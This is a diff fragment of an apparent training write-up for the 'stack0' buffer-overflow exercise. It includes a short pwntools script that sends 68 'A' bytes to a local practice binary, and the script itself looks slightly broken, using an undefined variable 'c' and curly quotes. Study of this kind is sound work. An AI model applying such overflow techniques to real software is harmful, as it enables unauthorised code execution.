@@ -29,8 +29,8 @@ int main(int argc, char **argv)
 this can be solved by normally overflowing the buffer with 68 A
 NOTE:  apply breakpoint before the cmp or test statement so that you can calculate offset without segmentation fault
 
-> from pwn import *
-sh=process(’stack0’)
+> from pwn import * \n
+sh=process(’stack0’) 
 sh.recvline(timeout=5)
 sh.send(b’A’*68)
 c.recv()
